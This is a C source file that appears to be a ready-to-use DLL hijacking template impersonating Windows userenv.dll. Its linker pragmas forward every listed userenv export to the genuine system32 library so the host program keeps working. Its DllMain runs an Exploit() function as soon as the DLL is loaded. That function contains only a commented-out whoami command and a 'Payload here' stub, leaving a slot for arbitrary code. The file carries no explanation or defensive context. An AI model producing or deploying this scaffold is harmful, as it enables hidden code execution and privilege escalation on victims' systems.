#pragma comment(linker,"/export:AreThereVisibleLogoffScripts=C:\\WINDOWS\\system32\\userenv.AreThereVisibleLogoffScripts,@106")
#pragma comment(linker,"/export:AreThereVisibleShutdownScripts=C:\\WINDOWS\\system32\\userenv.AreThereVisibleShutdownScripts,@107")
#pragma comment(linker,"/export:CreateAppContainerProfile=C:\\WINDOWS\\system32\\userenv.CreateAppContainerProfile,@108")
#pragma comment(linker,"/export:CreateEnvironmentBlock=C:\\WINDOWS\\system32\\userenv.CreateEnvironmentBlock,@109")
#pragma comment(linker,"/export:CreateProfile=C:\\WINDOWS\\system32\\userenv.CreateProfile,@110")
#pragma comment(linker,"/export:DeleteAppContainerProfile=C:\\WINDOWS\\system32\\userenv.DeleteAppContainerProfile,@111")
#pragma comment(linker,"/export:DeleteProfileA=C:\\WINDOWS\\system32\\userenv.DeleteProfileA,@112")
#pragma comment(linker,"/export:DeleteProfileW=C:\\WINDOWS\\system32\\userenv.DeleteProfileW,@113")
#pragma comment(linker,"/export:DeriveAppContainerSidFromAppContainerName=C:\\WINDOWS\\system32\\userenv.DeriveAppContainerSidFromAppContainerName,@114")
#pragma comment(linker,"/export:DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName=C:\\WINDOWS\\system32\\userenv.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName,@115")
#pragma comment(linker,"/export:DestroyEnvironmentBlock=C:\\WINDOWS\\system32\\userenv.DestroyEnvironmentBlock,@116")
#pragma comment(linker,"/export:DllCanUnloadNow=C:\\WINDOWS\\system32\\userenv.DllCanUnloadNow,@117")
#pragma comment(linker,"/export:DllGetClassObject=C:\\WINDOWS\\system32\\userenv.DllGetClassObject,@118")
#pragma comment(linker,"/export:DllRegisterServer=C:\\WINDOWS\\system32\\userenv.DllRegisterServer,@119")
#pragma comment(linker,"/export:DllUnregisterServer=C:\\WINDOWS\\system32\\userenv.DllUnregisterServer,@120")
#pragma comment(linker,"/export:EnterCriticalPolicySection=C:\\WINDOWS\\system32\\userenv.EnterCriticalPolicySection,@121")
#pragma comment(linker,"/export:ExpandEnvironmentStringsForUserA=C:\\WINDOWS\\system32\\userenv.ExpandEnvironmentStringsForUserA,@123")
#pragma comment(linker,"/export:ExpandEnvironmentStringsForUserW=C:\\WINDOWS\\system32\\userenv.ExpandEnvironmentStringsForUserW,@124")
#pragma comment(linker,"/export:ForceSyncFgPolicy=C:\\WINDOWS\\system32\\userenv.ForceSyncFgPolicy,@125")
#pragma comment(linker,"/export:FreeGPOListA=C:\\WINDOWS\\system32\\userenv.FreeGPOListA,@126")
#pragma comment(linker,"/export:FreeGPOListW=C:\\WINDOWS\\system32\\userenv.FreeGPOListW,@127")
#pragma comment(linker,"/export:GenerateGPNotification=C:\\WINDOWS\\system32\\userenv.GenerateGPNotification,@128")
#pragma comment(linker,"/export:GetAllUsersProfileDirectoryA=C:\\WINDOWS\\system32\\userenv.GetAllUsersProfileDirectoryA,@129")
#pragma comment(linker,"/export:GetAllUsersProfileDirectoryW=C:\\WINDOWS\\system32\\userenv.GetAllUsersProfileDirectoryW,@130")
#pragma comment(linker,"/export:GetAppContainerFolderPath=C:\\WINDOWS\\system32\\userenv.GetAppContainerFolderPath,@131")
#pragma comment(linker,"/export:GetAppContainerRegistryLocation=C:\\WINDOWS\\system32\\userenv.GetAppContainerRegistryLocation,@132")
#pragma comment(linker,"/export:GetAppliedGPOListA=C:\\WINDOWS\\system32\\userenv.GetAppliedGPOListA,@133")
#pragma comment(linker,"/export:GetAppliedGPOListW=C:\\WINDOWS\\system32\\userenv.GetAppliedGPOListW,@134")
#pragma comment(linker,"/export:GetDefaultUserProfileDirectoryA=C:\\WINDOWS\\system32\\userenv.GetDefaultUserProfileDirectoryA,@136")
#pragma comment(linker,"/export:GetDefaultUserProfileDirectoryW=C:\\WINDOWS\\system32\\userenv.GetDefaultUserProfileDirectoryW,@138")
#pragma comment(linker,"/export:GetGPOListA=C:\\WINDOWS\\system32\\userenv.GetGPOListA,@140")
#pragma comment(linker,"/export:GetGPOListW=C:\\WINDOWS\\system32\\userenv.GetGPOListW,@141")
#pragma comment(linker,"/export:GetNextFgPolicyRefreshInfo=C:\\WINDOWS\\system32\\userenv.GetNextFgPolicyRefreshInfo,@142")
#pragma comment(linker,"/export:GetPreviousFgPolicyRefreshInfo=C:\\WINDOWS\\system32\\userenv.GetPreviousFgPolicyRefreshInfo,@143")
#pragma comment(linker,"/export:GetProfileType=C:\\WINDOWS\\system32\\userenv.GetProfileType,@144")
#pragma comment(linker,"/export:GetProfilesDirectoryA=C:\\WINDOWS\\system32\\userenv.GetProfilesDirectoryA,@145")
#pragma comment(linker,"/export:GetProfilesDirectoryW=C:\\WINDOWS\\system32\\userenv.GetProfilesDirectoryW,@146")
#pragma comment(linker,"/export:GetUserProfileDirectoryA=C:\\WINDOWS\\system32\\userenv.GetUserProfileDirectoryA,@147")
#pragma comment(linker,"/export:GetUserProfileDirectoryW=C:\\WINDOWS\\system32\\userenv.GetUserProfileDirectoryW,@148")
#pragma comment(linker,"/export:HasPolicyForegroundProcessingCompleted=C:\\WINDOWS\\system32\\userenv.HasPolicyForegroundProcessingCompleted,@149")
#pragma comment(linker,"/export:LeaveCriticalPolicySection=C:\\WINDOWS\\system32\\userenv.LeaveCriticalPolicySection,@150")
#pragma comment(linker,"/export:LoadProfileExtender=C:\\WINDOWS\\system32\\userenv.LoadProfileExtender,@151")
#pragma comment(linker,"/export:LoadUserProfileA=C:\\WINDOWS\\system32\\userenv.LoadUserProfileA,@152")
#pragma comment(linker,"/export:LoadUserProfileW=C:\\WINDOWS\\system32\\userenv.LoadUserProfileW,@153")
#pragma comment(linker,"/export:ProcessGroupPolicyCompleted=C:\\WINDOWS\\system32\\userenv.ProcessGroupPolicyCompleted,@154")
#pragma comment(linker,"/export:ProcessGroupPolicyCompletedEx=C:\\WINDOWS\\system32\\userenv.ProcessGroupPolicyCompletedEx,@155")
#pragma comment(linker,"/export:RefreshPolicy=C:\\WINDOWS\\system32\\userenv.RefreshPolicy,@156")
#pragma comment(linker,"/export:RefreshPolicyEx=C:\\WINDOWS\\system32\\userenv.RefreshPolicyEx,@157")
#pragma comment(linker,"/export:RegisterGPNotification=C:\\WINDOWS\\system32\\userenv.RegisterGPNotification,@158")
#pragma comment(linker,"/export:RsopAccessCheckByType=C:\\WINDOWS\\system32\\userenv.RsopAccessCheckByType,@159")
#pragma comment(linker,"/export:RsopFileAccessCheck=C:\\WINDOWS\\system32\\userenv.RsopFileAccessCheck,@160")
#pragma comment(linker,"/export:RsopLoggingEnabled=C:\\WINDOWS\\system32\\userenv.RsopLoggingEnabled,@105")
#pragma comment(linker,"/export:RsopResetPolicySettingStatus=C:\\WINDOWS\\system32\\userenv.RsopResetPolicySettingStatus,@161")
#pragma comment(linker,"/export:RsopSetPolicySettingStatus=C:\\WINDOWS\\system32\\userenv.RsopSetPolicySettingStatus,@162")
#pragma comment(linker,"/export:UnloadProfileExtender=C:\\WINDOWS\\system32\\userenv.UnloadProfileExtender,@163")
#pragma comment(linker,"/export:UnloadUserProfile=C:\\WINDOWS\\system32\\userenv.UnloadUserProfile,@164")
#pragma comment(linker,"/export:UnregisterGPNotification=C:\\WINDOWS\\system32\\userenv.UnregisterGPNotification,@165")
#pragma comment(linker,"/export:WaitForMachinePolicyForegroundProcessing=C:\\WINDOWS\\system32\\userenv.WaitForMachinePolicyForegroundProcessing,@166")
#pragma comment(linker,"/export:WaitForUserPolicyForegroundProcessing=C:\\WINDOWS\\system32\\userenv.WaitForUserPolicyForegroundProcessing,@167")


#include <windows.h>

int Exploit()
{
    //("whoami > C:\\whoami.txt");
    //Payload here
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}